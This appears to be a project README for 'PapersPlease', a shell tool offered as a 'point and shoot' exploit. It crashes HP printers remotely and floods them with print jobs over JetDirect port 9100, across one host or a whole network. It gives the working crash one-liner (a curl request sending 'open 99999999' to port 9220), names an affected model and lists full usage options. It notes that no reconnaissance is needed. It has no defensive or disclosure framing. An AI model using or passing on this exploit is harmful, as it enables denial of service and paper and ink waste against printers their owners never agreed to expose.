
<div align="center">

<img src="./Assets/Papers_Please_Logo.png" width="20%" />
<br><br>
</div>

## Description

PapersPlease is an exploit that allows an attacker to remotely crash an HP printer by exploiting the internal GGW server.
So far residential class printers have been observed to be exploitable by this vulnerability.
The tool also comes with the ability to mass print documents from either a single printer 
or all printers on a network by abusing HPs JetDirect protocol found on port 9100.

## How It Works

While the inner workings are more complicated, the exploit in its purest form is as follows:
<br><br>
`curl [IP]:9220 -X 'open 99999999'`
<br><br>
Whats happening here is we are telling the internal GGW server to retrieve the process name running on index number 99999999. However upon receiving the request, the GGW server will instantly crash.
At this time it is unknown exactly why the GGW server crashes when receiving such a request as it is well within range of the allowed index number length which is any number <= 19 digits. In addition, any index number 8 or 9 digits in length will cause the GGW server to crash.

## Known Affected Models
| Model | DoS | Mass Print | GGW Version |
| :---:  | :---: | :---: | :---: |
| HP Envy 7640 |  True  |  False  |  Version: 1.0  |

**NOTE**:<br>
While the above models are confirmed to be vulnerable, you will usually not know what you are exploiting in the real world.
As the program is made to be a 'point and shoot' no prior recon is required.
However you can still specify specific printers with the `--target` flag.

## Supported Platforms

All x86-64 Linux distributions with parallel in their repositories and/or are able to build said package.

Android phones are also compatible through `Termux`, an Android terminal application. 

## How to Use

This program is designed to be very quick and simple to use. As most of the time it will not be required to pass any flags to the program. However you can manually enter which network is to be exploited or if not the entire network, then a specific printer. 

## Usage

```
./Papers_Please.sh [OPTION]
OPTION:			    DESCRIPTION:
-t, --target={IP}	    Specify a specific
			    target rather than
		     	    all addresses on
			    the network.

-n, --network={IP/CIDR}     Manually specify the
			    network address for
			    the current network
			    you are on.

--papyrus={N}	    	    Number of jobs to
			    send to the printer
			    this should cause
			    the printer to print
			    N number of pages.

-i, --interval={N}  	    The interval before
			    another job is sent
			    to the printer. Where
			    N can be a decimal
			    i.e. 0.1 or a whole
			    number. The default
			    interval is 1.

-j, --jobs={-N|+N|N%|N}     Number of jobs to
			    run. Passes value
			    to parallel.
			    Defaults to 0.

-p, --proc={-N|+N|N%|N}	    Define the maximum
			    N of processes that
			    can be active at a
			    time. Defaults to
			    1.

-s, --slots={-N|+N|N%|N}    The amount of
			    'slots' available
			    to be used by
			    parallel for jobs.
			    Default is 252.

-P, --port={PORT} 	    Specify a specific 
			    port. Useful for 
			    port-forwarded
			    hosts. Port number 
			    is set automatically 
			    based on the attack
			    being preformed.
			    PORT can be any
			    number ranging
			    from 1 to 65535. 

--no-check		    Will skip dependency
			    checking.

-q, --quiet		    Suppress output to
			    terminal. Only the
			    progress bar from
			    parallel will be
			    printed to the
			    terminal in this
			    mode.

-v, --version		    Print version
			    information
			    then exit.

-h, --help		    Print this
			    dialog page.
```
